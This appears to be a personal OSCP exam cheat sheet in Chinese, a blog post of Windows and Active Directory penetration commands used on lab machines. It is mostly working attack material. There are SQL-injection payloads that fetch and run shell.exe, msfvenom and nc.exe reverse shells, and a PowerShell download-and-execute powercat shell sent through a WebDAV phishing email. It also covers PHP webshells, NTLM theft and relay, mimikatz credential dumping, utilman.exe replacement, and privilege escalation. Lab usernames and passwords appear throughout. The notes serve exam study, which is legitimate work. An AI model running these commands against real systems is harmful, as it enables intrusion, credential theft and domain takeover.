---
title: OSCP Cheat Sheet 1
date: 2026-06-15
ShowToc: true
draft: false
TocOpen: true
password: SecuityFirst
isPrivate: true
tags:
  - blog
  - Misc
lastmod: 2026-06-15T09:59:13.055Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/yourmachine" >}}

***

# Windows域渗透与单机渗透

### 如果没有信息在重新做信息收集

### 1. 信息收集

一般就是三台机器DC,ms01（一般入口），ms02；

1. 枚举用户，使用`kerbrute_linux_amd64`枚举用户，或者`ldapsearch`枚举

`./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100`位于`~/Desktop/kerbrute`

2. `nmap -p88,389 ip -Pn --script "ldap*"`,扫描域用户

3. **遇到类似"admin@2018"这样的密码但是登陆失败，可以按照年份一个个往后推，如admin@2019......,大概就是密码**

4. nmap扫描域名`nmap -p88 ip -Pn --script "ldap*"`，配合后续ldapsearch使用

### 2. 端口利用

链接某个端口,`nc -nv ip port`,然后输入help查看帮助，如果有version之类的就可以查看是否有漏洞

或者`telnet ip port`同样的作用

**21端口**

1. 弱口令admin/admin,ftp/ftp等

2. 看到`.htpasswd`文件，要及时下载

3. `wget -m ftp://anonymous:anonymous@10.10.10.98`进行下载

4. `wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98`进行下载

**80端口**

1. 当遇到修改pass的界面时，我们可以抓包进行修改，直接加入到请求头中

![alt text](image-3.png)

更改为

![alt text](image-4.png)

2. Windows的host文件存在`C:\Windows\System32\drivers\etc\hosts`

3. iis目录存在一个`web.config`文件，位于`/inetpub/wwwroot/web.config`

4. `enum4linux -a -o 域名`枚举，或`enum4linux-ng ip`枚举

5. `curl -X POST -H 'Content-Length:0' http://169.254.177.99:33333/list-current-deployments`直接使用POST访问

6. 无法访问隐藏文件，按`ctrl+H`

7. 使用kerbrute查看用户`kerbrute -users /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -domain hokkaido-aerospace.com`

8. `wfuzz -u https://streamio.htb -H "Host:FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315`爆破域名

9. `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://watch.streamio.htb/ -x .php`实现查询

10. `hydra -L users.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"`用hydra进行爆破

```

格式："路径:POST数据:失败标识"

"/login.php

目标登录页面的路径

username=^USER^&password=^PASS^

POST 请求的表单数据

^USER^：Hydra 会自动替换为 users.txt 中的用户名

^PASS^：Hydra 会自动替换为 passwords.txt 中的密码

:F=Login failed

失败条件标识：F= 表示查找响应中的文本

如果服务器响应中包含 "Login failed" 这个字符串，就认为这次尝试失败

反之，如果不包含这个字符串，就认为成功

```

11. `7z l -slt Access\ Control.zip`  or  `7z x Access\ Control.zip`使用7z解压缩

12. `strings -n 8 backup.mdb | sort -u > ../Engineer/wordlist`strings输出的内容通过sort的-u参数去重，然后在输出到文件里面,从backup.mdb文件中输出内容大于等于8的内容

13. Outlook文件使用readpst，mbox文件使用less

14. 如果可以上传.htaccess文件，上传文件内容为`AddType application/x-httpd-php .evil`,然后在上传~/windowstool/wwwolf-php-webshell/webshell.php.evil

15. sql注入可能有xp\_cmdshell

```bash

SQL注入payload1:

';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.223/shell.exe c:/temp/shell.exe';--

  

SQL注入payload1:

';exec xp_cmdshell 'c:/temp/shell.exe';--

```

**143端口**：

1. 电子邮件枚举，IMAP服务

```bash

nc ip 143

# 连接端口

tag login name@localhost pass

# name和后面的pass都是你要信息收集的信息

# example: tag login jonas@localhost SicMundusCreatusEst

tag LIST "" "*"

# 列出服务器上所有的邮箱（邮件文件夹）

tag SELECT INBOX

# 切换到 INBOX 邮箱,此处是上面列举出的邮箱

tag STATUS INBOX (MESSAGES)

# 查询邮箱状态

tag fetch 1 (BODY[1])

# 获取邮件内容的命令，这里是序列号为1的

tag fetch 2:5 BODY[HEADER] BODY[1]

# 一次性获取多个邮件内容，这里是2-5

# Hepet靶机

# 这里可能有宏注入攻击，基于邮件的服务器解析邮件

```

**389端口**：

1. ldapsearch查看域用户。在上面nmap扫描出域名，使用`ldapsearch -H ldap://ip -x -b "dc=htb,dc=local"`

`ldapsearch -H ldap://streamIO.htb  -x -s base -b '' "(objectClass=*)" "*" + >ldap_result.txt`

2. 利用ldapsearch寻找特定用户`ldapsearch -x -H ldap://ip -D 'name@dc.htb' -w 'password' -b "dc=active,dc=htb"`

`ldapsearch -x -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"  #类似的`

3. `cat ldap.txt|grep Pass`大概有密码

4. ldap输出需要注意的内容

```bash

cat ldap.txt|grep Password

# 查看密码信息

cat ldap.txt|grep @local.htb

# local.htb是你找到的信息，这一步用来筛选用户

cat ldap.txt|grep lock

# 如果lockoutThreshold输出0，说明可以爆破不被锁

```

**139，445端口**:

1. smb匿名登陆

```bash

# smb登录时-U参数最好加上域名，级dc/name，比如laser.com/abx

smbclient -N -L //ip/ # 查看挂载

smbclient -N //ip/backup # backup是上面可以匿名登陆的挂载

RECURSE ON

PROMPT OFF

mput Backup_2024

# 这会无需任何确认地将本地 Backup_2024 目录整个递归上传到远程服务器当前目录。

mget ProjectFiles

mget *

# 这会把远程服务器上 \ProjectFiles 目录及其所有子目录和文件全部下载到本地当前目录。

```

2. smb账号登陆`smbclient //192.168.1.100/share -U admin%Password123`,其中%分割账号密码

3. 如果中间有空格，使用`smbclient \\\\192.168.204.175\\Password\ Audit -U 'V.Ventz%HotelCalifornia194!'`进行登陆

4. `nmap -T4 -p445 --script smb-vuln* 192.168.212.40`扫描漏洞

**3128端口**：Squid 是一个缓存和转发的 HTTP 网络代理。它有多种用途，包括通过缓存重复请求来加速 web 服务器，为共享网络资源的一组人缓存。使用spose.py,`python spose.py --proxy http://192.168.159.189:3128 --target 192.168.159.189`,这里的proxy和target都是靶机目标ip,然后在浏览器里settings里更改proxy，然后就可以访问，位于`/windowstool/spose`

**5222端口**：XMPP端口，使用pidgin，移步至工具查找使用方法

**5985端口**：可以不用过多查看，evil连接端口，使用`evil-winrm -i ip -u username -p password -S`,这里的username和password都是要自己找，大多数都是impacket系列工具寻找。这个工具好用在上传和下载`evil-winrm-py -i 192.168.203.158 -u d.chambers -p 'pass123'`

这个在下载大文件时较快

```bash

# 要在同一目录下执行

上传： upload 文件名 # example: upload 1.txt

下载： download 文件名 # example: download 1.txt

```

### 3. 工具利用

`上传文件时如果c:\Users\Public无法上传，试试c:\\Users\\Public`

1. **impacket系列工具**

```bash

1.1 impacket-GetNPUsers使用

impacket-GetNPUsers 域名 -dc-ip ip -no-pass

# example：impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass

# 可以获得一个哈希值，进行破解

hashcat hash.txt

# 查看hash类型，example 18200

hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# 破解hash值

impacket-GetNPUsers -usersfile user.txt -request -format hashcat -outputfile asp.txt 'jab.htb/'

# user.txt是你找到的user字典集，-format是输出形式为hashcat可以辨认的形式，-outputfile输出到asp.txt，后面的是域名

-------------------------------------------------------

1.2 impacket-GetUserSPNs

impacket-GetUserSPNs dc/name:'pass' -dc-ip ip -request

# example impacket-GetUserSPNs active.htb/SVC:'123456' -dc-ip 10.10.10.100 -request

# 如果报错，说明时间错开太大

ntpdate -u ip

# ip为靶机ip

impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 172.16.201.151 -debug -outputfile kerberoast.txt

john -w=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt kerberoast.txt

# 获取密码，

-------------------------------------------------------

1.3 impacket-secretsdump

impacket-secretsdump username:'password'@ip

# example：impacket-secretsdump abc:'abc123'@10.10.10.161

# 抓取administrator的hash值，后续直接登录

evil-winrm -i ip -u username -H hash

# 直接利用hash登陆

impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL

# 脚本来离线提取 NTDS（域数据库）中的用户凭据哈希。

# 需要ntds.dit和SYSTEM文件

-------------------------------------------------------

1.4 impacket-psexec

impacket-psexec dc/username:'password'@ip

# example: impacket-psexec active.htb/john:'abc123.'@10.10.10.161

# 利用账号密码登陆，前提是管理员用户或者管理员用户组，没有dc就不写dc

or

impacket-psexec dc/name@10.129.193.109

# example: impacket-psexec active.htb/administrator@10.129.193.109

# 后续会有输入密码的阶段，把密码输入

or

impacket-psexec EGOTISTICAL-BANK.LOCAL/administrator@10.129.255.251 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e

# 最后的提权会用到，使用impacket-secretsdump获取到的hash值直接写入即可

-------------------------------------------------------

1.5 impacket-mssqlclient

impacket-mssqlclient user:pass@dc

# example: impacket-mssqlclient publicuser:guestuser@sql.htb

responder -I tun0

# 打开smb

在impacket-mssqlclient： EXEC MASTER.sys.xp_dirtree '\\10.10.16.4\test',1,1

# 这是你的smb共享目录，可以获取hash值

# 遇到Log目录一定要去查看日志

# 读文件的操作详细看提权

# 将所有内容全部复制进行破解

///////////////////////////////////////////////////////////////////

impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@192.168.241.40 -dc-ip 192.168.241.40 -windows-auth

SELECT name FROM master..sysdatabase

# 查询数据库

use hrappdb

# 使用数据库

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

# 检查一下可以在 MSSQL 上冒充的任何用户。

EXECUTE AS LOGIN = 'hrappdb-reader'

# 如果有就可以冒充

use hrappdb

SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;

# 查询目录

select * from sysauth;

# 查询数据

///////////////////////////////////////////////////////////////////

# 当你可以登陆时，使用以下方法提权

SELECT is_srvrolemember('sysadmin');

# 出现1就可以提权

enable_xp_cmdshell

# 接下来就可以执行命令

# xp_cmdshell "whoami"

exec xp_cmdshell 'whoami'

# 尽量用下面这个，可以使用‘’和“”

# 后续如果要上传文件去ligolo-ng看

///////////////////////////////////////////////////////////////////

impacket-mssqlclient user:pass@dc -windows-auth

-------------------------------------------------------

1.6 impacket-ticketer

# 白银票据攻击，具体去提权那里看

-------------------------------------------------------

1.7 impacket-docmexec

# DOCM攻击工具,openfileke最容易有这个漏洞

impacket-docm -object MMC20 -silentcommand -debug dc/name:'pass'@ip 'curl http://lhost'

# dc是靶机的域名，name是用户名，pass是密码，ip是靶机地址，后面的命令可以自己修改

msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe

# 生成木马

impacket-docm -object MMC20 -silentcommand -debug dc/name:'pass'@ip 'curl http://lhost/shell.exe -o C:\Windows\Temp\shell.exe'

# 上传木马

impacket-docm -object MMC20 -silentcommand -debug dc/name:'pass'@ip 'C:\Windows\Temp\shell.exe'

# 执行木马，这几步都要上传到可写目录，一般是temp和public

------------------------------------------------------

1.8 impacket-ntlmrelayx

# 中间人攻击，使用.lnk文件获得hash但是无法破解的时候，使用responder获得hash

nxc smb 192.168.147.172-174 -u 'Eric.Wallows' -p 'EricLikesRunning800' --gen-relay-list targets.txt

# 首先对可以使用ntlmrelayx的ip进行筛选，输出到targets.txt

impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt

# 可能会有administrator的hash，注意到哪个ip的hash。

------------------------------------------------------

1.9 impacket-wmiexec

impacket-wmiexec o.foller:EarlyMorningFootball777@192.168.220.160 -dc-ip 192.168.220.158

# evil-winrm无法登录时可以尝试

```

2. **nc.exe反弹**

```bash

curl http://ip/port/nc.exe -o \Users\Public\nc.exe # 下载nc

nc.exe ip port -e cmd # 反弹shell

```

3. **bloodhood工具**

```bash

cd ~/Desktop/neo4j-community-4.4.46-unix/neo4j-community-4.4.46/bin

export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64

export PATH=$JAVA_HOME/bin:$PATH # 换为java 11启动

./neo4j console # 首先开启neo4j

cd ~/Desktop/windowstool/bloodhound/BloodHound-linux-x64

./BloodHound --no-sandbox # 开启bloodhood

# name: neo4j     pass: lin123

# 点击右边upload data，等待信息输入

bloodhound-python -d zeus.corp -u Eric.Wallows -p EricLikesRunning800 -ns 192.168.226.158 -c All --zip

# 外部blood收集信息

----------------------------------------------

PS: uploads sharphound.exe

PS: ./sharphound.exe -c All

PS: downloads asd.zip

Node Info -> OUTBOUND OBJECT CONTROL -> First Degree Object

```

4. **openssl工具**破解.pfx文件

```bash

openssl pkcs12 -in left.pfx -nocerts -out key.pem -nodes

# 从pfx文件中提取私钥

openssl pkcs12 -in lsft.pfx -nokeys -out cert.pem

# 从pfx文件中提取证书

evil-winrm -i ip -c cert.pem -k key.pem -S

# evil直接登陆

```

5. **nxc工具**，密码喷洒

```bash

nxc smb ip -u name -p 'pass' --shares

# name和pass是你找到的账号密码

# 密码可以是空密码，接下来使用ntlm生成test文件

cd ~/Desktop/windowstool/ntlm_theft

python3 ntlm_theft.py -g lnk -s 192.168.45.189 -f test

# 填自己的ip

sudo responder -I tun0 # 开启监听

smbclient -N //IP/

cd test

put test.lnk

# 等待几分钟就可以会弹hash

hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O --force

# 保存为hash

----------------------------------------------------------------------------------

nxc winrm ip -u user.txt -p pass.txt

# user.txt里面有你的用户名爆破字典

nxc winrm ip -u 'admin' -p 'password'

# 不变的账号密码要用引号

# 可能后面要加上--local-auth

----------------------------------------------------------------------------------

nxc smb ip --users

nxc smb ip -u 'dsad' -p '' --rid-brute

# 可能获取用户信息

nxc smb ip  -u user -p pass --continue-on-success

# 查看用户名和密码是否有用

# 获取到的用户信息使用impacket-GetNPUsers枚举

impacket-wmiexec o.foller:EarlyMorningFootball777@192.168.104.160 -dc-ip 192.168.104.158

# nxc smb显示[+]而并非pwn3d！，可以使用这个进行登录，但要搞清楚域ip

---------------------------------------------------------------------------------

# 使用nxc smb发现pwn3d！时，可以使用-x进行外部执行命令

nxc smb 172.16.178.14 -u Administrator -H '60446f9e333abfda8c548cbe11daedc2' -x 'whoami'

# 比如这样

proxychains pth-smbclient //172.16.178.14/C$ -U relia.com/Administrator --pw-nt-hash '60446f9e333abfda8c548cbe11daedc2' -c 'put shell.exe Windows/Temp/shell.exe'

proxychains nxc smb 172.16.178.14 -u Administrator -H '60446f9e333abfda8c548cbe11daedc2' -x 'c:\windows\Temp\shell.exe'

# 可以这样上传文件ip和user,hash记得改，这样可以适用没开启5985但是显示pwn3d进行反弹shell

---------------------------------------------------------------------------------

PS: net localgroup administrators user /add

# user就是你已知密码的用户

# 需要先执行ifconfig tun0 mtu 1000

nxc smb 192.168.220.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy

# 获得账号密码可以这样获取一些密码

# 如果不行就复原一下，等待时间较久

# 获取的信息

impacket-secretsdump oscp.exam/Eric.Wallows:'EricLikesRunning800'@192.168.154.147

# 获取hash值

# 获取到类似的OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2022-12-01 11:08:56+00:00)

echo '$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3' > hash.txt

hashcat -m 2100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# 会获得密码

```

6. **gpp-decrpty**

在windows下的`policies`目录下如果找到加密的hash值，使用`gpp-decrypt`工具解密

`gpp-decrypt hash`,其中的hash是你找到的hash值

7. **钓鱼邮件**

```bash

python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homeworking' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.24\test.txt" --subject test

# mailing.htb 是域，账号密码为找到的账号密码，sender是发送方，recipient是接收方，url是你的ip地址，subject是你要发的内容

responder -I tun0

# github地址：https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git

impacket-smbserver share ./

# 如果上面接收不到hash值，用这个接收

```

8. **cadaver**

`cadaver http://ip/`,然后输入账号密码，可以上传文件，使用put上传

9. **powershell**

`powershell -ep bypass`可以进入powershell环境

10. github如果无法`git clone`,使用`proxychain4 git clone`

11. **pidgin**

12. **ViewState工具**

容易受到反序列化攻击

```bash

# iis目录存在一个`web.config`文件，先查看web.config文件

https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net

# 使用方法说明

https://github.com/pwntester/ysoserial.net

# 工具下载地址

ysoserial.exe -p ViewState -c "mkdir c:\temp" --path="/portfolio" --apppath="/" --

validationalg="SHA1" -validationkey=5620D3D029F91

4F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg="AES" --islegacy --isdebug

# 要在Windows上执行，Linux上不行

# validationkey是在web.config上的decryptionkey的值，-c内是你要执行的命令

# 然后会生成一长串代码，复制到VIEWSTATE中

```

13. **LFI工具**

```bash

msfvenom -p php/reverse_php LHOST=192.168.45.195 LPORT=445 -f raw > shell_445.php

# 生成正向shell，记下来在网页上访问http://ip:port/shell_445.php

靶机: cd C:\Users\Public

kali: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=4443 -f exe > shell.exe # 生成反向shell

靶机: curl http://ip:port/shell.exe -o shell.exe

靶机: shell.exe

# 生成交互式shell

```

14. **SSRF工具**

```bash

# 如果在网页可以访问kali ip，那么符合ssrf

responder -I tun0

# 监听tun0

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 将获取到的hash使用John破解

```

15. **rpcclient工具**

```bash

rpcclient -W '' -c querydispinfo -U''%'' '192.168.120.181'

# 列举域内的用户名，`reminder`是密码

rpcclient -U '' -N IP

# 空账号密码访问

rpcclient -U nagoya-industries/svc_helpdesk 172.16.201.151

# 后续输入密码登录

rpcclient $> setuserinfo2 Christopher.Lewis 23 Start123!

# 重置密码

```

16. **文件上传绕过**

```bash

vim .htaccess

AddType application/x-httpd-php .evil

# 尝试上传

vim shell.php.evil

# <pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>

# 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功

```

17. **ILSpy工具**

```bash

# 一款逆向工具，可以寻找源码中的信息

cd ~/Desktop/windowstool/artifacts/linux-x64

./ILSpy #后将文件导入

```

18. `awk -F'[[:space:]]+' '{print $5}' user.txt>user.list`使用awk提取第五列

19. **John工具**

```bash

john 1.txt # 获取加密方法

# Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])从这一行看出是“krb5asrep”

john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt 1.txt

```

20. `SELECT "<?php echo system($_GET['cmd']); ?>" into OUTFILE 'C:/wamp/www/shell.php' `写入phpmyadmin建立档案，后面的地址查看phpinfo，可能有弱密码`root/(空密码)`

21. **mdxfind工具**

```bash

# 位于windowstool

echo "a2b4e80cd640aaa6e417febe095dcbfc" | ./mdxfind -h 'MD5' -s salt.txt pass.txt -i 5

# 指示五次迭代，这里的salt和pass是你可能的盐值以及确定的密码

# MD5PASSSALTx02 a2b4e80cd640aaa6e417febe095dcbfc:YOUR_SALT_HERE:wazowski

# x02说明两次迭代即可

echo "844ffc2c7150b93c4133a6ff2e1a2dba" | ./mdxfind -h 'MD5PASSSALT' -s salt.txt /usr/sharewordlists/rockyou.txt -i 2

# 两次迭代破解密码

xfreerdp /v:192.168.120.156 /u:mike /p:Mike14

# 远程连接电脑，账号密码

# 如果用xfreerdp和rdesktop都连接不了使用remmia

remmia

# 接下来找地方输入账号密码即可

```

22. 当在bloodhound中发现genercwrite，使用`python targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.241.40`,位于`windowstool//targetedKerberoast`

23. blodhound发现是IT成员，可以强制更改一级管理员的通行证

`rpcclient -N  192.168.208.40 -U 'hazel.green%haze1988'`

`setuserinfo2 MOLLY.SMITH 23 'Password123!'`

24. mimikatz工具,位于windowstool/mimikatz

```bash

certutil -urlcache -split -f http://192.168.45.217/mimidrv.sys mimidrv.sys

# 将里面的所有东西上传，先上传

# 位于windowstool/mimikatz

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d 0 /f

shutdown /r /t 0

# 重启后才生效

.\mimikatz.exe

log

privilege::debug

sekurlsa::logonpasswords

# 可能会有账号密码

lsadump::dcsync /domain:zeus.corp /all /csv

# domain后面的换成靶机的域

```

25. ftpc/frps工具

```bash

kali: cd ~/Desktop/windowstool/frp_0.68.1_windows_amd64

# 上传**frpc.exe**和frpc.ini

# frpc.ini自己改ip

kali: cd ~/Desktop/frp_0.68.1_linux_amd64

kali: ./frps -c frps.ini

# 注意这里是frps而并非frpc

PS: ./frpc.exe -c frpc.ini

kali: vim /etc/proxychains4.conf

# 写入socks5 192.168.45.217 6000

# 这里的ip是自己的ip，接下来就可以进行内网穿透

```

26. 除了id\_rsa,还有id\_ecdsa和id\_ed25519

27. 利用 WebDAV 挂载攻击 Windows 用户

```bash

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav

# 首先开启，但是一定要有webdav文件夹

# 接下来去windows创建快捷模式

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.248:8080/powercat.ps1');powercat -c 192.168.45.248 -p 1337 -e powershell"

# 输入以后直接回车，名字无所谓

# 然后复制到kali中，再把文件复制到webdav中

<?xml version="1.0" encoding="UTF-8"?>

<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

<name>@windows.storage.dll,-34582</name>

<version>6</version>

<isLibraryPinned>true</isLibraryPinned>

<iconReference>imageres.dll,-1003</iconReference>

<templateInfo>

<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>

</templateInfo>

<searchConnectorDescriptionList>

<searchConnectorDescription>

<isDefaultSaveLocation>true</isDefaultSaveLocation>

<isSupported>false</isSupported>

<simpleLocation>

<url>http://192.168.45.173 </url>

</simpleLocation>

</searchConnectorDescription>

</searchConnectorDescriptionList>

</libraryDescription>

# 此处为config.Library-ms文件，记得改ip

sudo swaks -t jim@relia.com --from mark@relia.com --attach @config.Library-ms --server 192.168.214.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

# 创建一个body.txt文件，里面随便写点东西，此处ip为靶机ip

# 接下来要输入账号密码，记得开启监听和python文件上传

```

28. wireshark，即.pcapng文件，使用`http.request.method == "POST" and http.request.uri == "/login"`可以查找可能包含登录信息文件，`ip.addr == 192.168.1.100`筛选ip，` http.request.method == "GET"`筛选协议

29. 使用ps查看是否有mysqld开启，然后寻找mysqldump.exe位置，最后使用`mysqldump.exe -u root --all-databases > db.sql`，如果没有密码就可以直接导出，可能会有信息

30. ligolo-ng工具

```bash

# 首先上传agent.exe，位于windowstool/agent_windows

PS: .\agent.exe -connect 192.168.45.170:11601 -ignore-cert

# 这里的ip是你的攻击机ip

kali: ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 直接按回车

ligolo-ng » session

[Agent : OSCP\MS01$@MS01] » autoroute

# 然后选择内网（上下选择，空格确定，回车执行）

[Agent : OSCP\MS01$@MS01] » listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999

# 这个是在要上传文件的时候执行

[Agent : OSCP\MS01$@MS01] » ifconfig

# │ IPv4 Address │ 10.10.114.147/24 出现类似的内网地址，后续执行都要使用内网地址，比如我们kali也要执行python -m http.server 9999，内部反弹shell也要对这个ip反弹，端口也要是9999（和上面一致）

```

### 5. **提权**

```bash

whoami /priv #查看个人权限

whoami /groups #查看组

net user /domain

Get-ADDomain

net user username

cmdkey /list # 查看电脑上存在的凭证

systeminfo

netstat -ano

update powerup.ps1

# 位于windowstool/powerup-encoded;

. .\PowerUp.ps1;Invoke-AllChecks

findstr /SIM /C:"pass" *.ini *.cfg *.xml

# 在当前目录及其子目录不区分大小写寻找含有字符串的文件

Get-ChildItem -path C:\Windows\System32\ -include utilman.exe -file -recurse -erroraction silentlycontinue

# 用于在 Windows 系统目录中递归搜索 utilman.exe 文件。

net localgroup administrators 用户名 /add

# 将某个用户加到administrator组

dir /s /b /ah C:\.git

# 搜索隐藏文件.git

```

1. `net user`提权汇总

```bash

1.1 Event Log Readers权限

Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt

# 获取内容

```

1. powershell日志获取，如果使用了powershell，一定会有日志，去powershell目录底下寻找。

`C:\Users\name\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`,其中name是你的用户

2. 命令劫持提权（exe，dll），exe文件有修改权限，进行修改提权。

dll提权就是我们对于.exe文件没有修改权限，但是对他调用的dll文件有修改权限，这里我们就可以提权

`net user username`属于`Contractors`组，可以进行dll劫持提权

`msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f dll > shell.dll`

3. mysql寻找信息`mysql -uroot -proot -e"show databases;"`mysql一定要尝试默认账号root

4. `whoami /priv`提权信息汇总

`土豆提权`

![alt text](image-2.png)

就比如这里可以使用4.0，3.5，2.0，先用4.0，后3.5，后2.0，用最高的

```bash

# 总体可以去 https://github.com/gtworek/Priv2Admin 看怎么提权，查找的时候去掉Privilege

4.1 SeImpersonatePrivilege 权限

土豆提权 whoami /priv 查看信息，如果存在SeImpersonatePrivilege权限，可以提权，同时使用那个也要查注册表，

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

最后的那个就是我们想的版本，尽量用高版本,详细看

https://blog.csdn.net/qq_42699326/article/details/144334216?ops_request_misc=elastic_search_misc&request_id=259c7e6dd931c1ea276a731697c504c9&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144334216-null-null.142^v102^pc_search_result_base5&utm_term=windows%E5%9C%9F%E8%B1%86%E7%B3%BB%E5%88%97%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187

-----------------------------------------------------------------------------------------------

# 或者使用PrintSpoofer64.exe

PS: PrintSpoofer64.exe -i -c powershell

PS: ./PrintSpoofer64.exe -c 'C:\Users\TEMP\Documents\shell.exe'

```

```bash

4.2 SeDebugPrivilege 权限

输入 whoami /priv 出现SeDebugPrivilege权限，就相当于可以调试其他程序，如果有adminstrator的进程可以调试，就可以进行提权

whoami /priv  # 查看权限

ps  # 查看进程

# 几个默认的高权限 比如显示556

https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1

# github下载地址

upload nc.exe # 上传nc.exe

ipmo .\/psgetsys.ps1

ImpersonateFromParentPid -ppid 556 -command "c:\windows\system32\cmd.exe" -cmdargs "/c C:\Users\alaading\Documents\nc.exe ip port -e cmd"

# 后面这个就是反弹shell，nc位置和自己的ip，port设置好

```

```bash

4.3 SeManageVolumePrivilege 权限

whoami /priv 如果显示 SeManageVolumePrivilege ,可以使用 SeManageVolumeExploit.exe 文件提权。上传后使用即可。

# 先上传SeManageVolumeExploit.exe

PS: icacls C:\Windows

kali: cd ~/Desktop/windowstool/WerTrigger/bin

# 将里面的三个全部上传

PS: copy phoneinfo.dll C:\Windows\System32\phoneinfo.dll

PS: .\WerTrigger.exe

# 不会有任何输出，然后用nc.exe进行反弹shell

  

```

```bash

4.4 SeRestorePrivilege权限

whoami /priv 如果显示 SeRestorePrivilege ，可以使用EnableSeRestorePrivilege.ps1 文件提权,或者SharpGPOAbuse.exe提权

SharpGPOAbuse.exe

PS C:\Users\anirudh\Documents> uploads /root/Desktop/windowstool/SharpGPOAbuse.exe

# 上传文件

PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"

# 这里的账号是你的账号名字

PS C:\Users\anirudh\Documents> gpupdate /force

PS C:\Users\anirudh\Documents>

impacket-secretsdump vault.offsec/anirudh:SecureHM@192.168.208.172

# 正常位于windows/system32，如果可以直接复制

# 抓取hash

# impacket-psexec vault.offsec/anirudh:SecureHM@192.168.120.116

# 直接登录

----------------------------------------------------------------------------------------------

EnableSeRestorePrivilege.ps1

PS C:\Users\svc_apache$\Documents> .\EnableSeRestorePrivilege.ps1

PS C:\Users\svc_apache$\Documents> move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old

PS C:\Users\svc_apache$\Documents> move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

kali: rdesktop ip

# 需要开启3389端口

# 后续按win+u即可提权

# EnableSeRestorePrivilege.ps1.bak这个也有可能

```

```bash

4.5 SeBackupPrivilege 和 SeRestorePrivilege

# 建议使用evil-winrm-py下载更快

# download c:\temp\system /root/Desktop/system

# 先进去虚拟环境

# 下载需要提供路径

# 我们可以把sam，system转储出来，破解administrator的hash值，接着利用PTH进行哈希传递攻击，从而获取administrator权限

PS: reg save hklm\sam c:\temp\sam

PS: reg save hklm\system c:\temp\system

PS: downloads sam

PS: downloads system

kali: impacket-secretsdump -sam sam -system system local

kali: evil-winrm -i ip -u Adminstrator -H hash # :后半部分

------------------------------------------------------------------------------

PS: uploads SeRestorePrivilege.txt

PS: DISKSHADOW /s SeRestorePrivilege.txt

PS: robocopy /b e:\windows\ntds . ntds.dit

PS: downloads ntds.dit

